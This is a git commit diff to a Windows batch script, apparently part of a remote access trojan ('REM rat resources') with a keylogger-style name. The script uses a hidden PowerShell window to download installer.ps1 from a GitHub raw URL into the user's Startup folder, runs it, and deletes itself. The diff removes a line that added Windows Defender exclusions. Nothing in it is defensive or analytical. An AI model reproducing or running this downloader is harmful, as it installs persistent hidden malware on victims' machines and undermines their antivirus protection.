0899ea809acb147088ec61c76a23ff8b1309732a
jfrdgh <162196506+jfrdgh@users.noreply.github.com>
2024-03-10 14:26:59 +0000

    Update GetAdmnInstKL.cmd

--- files/GetAdmnInstKL.cmd
+++ files/GetAdmnInstKL.cmd
@@ -37,7 +37,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1 -OutFile installer.ps1"
 powershell ./installer.ps1
 
 @REM self delete
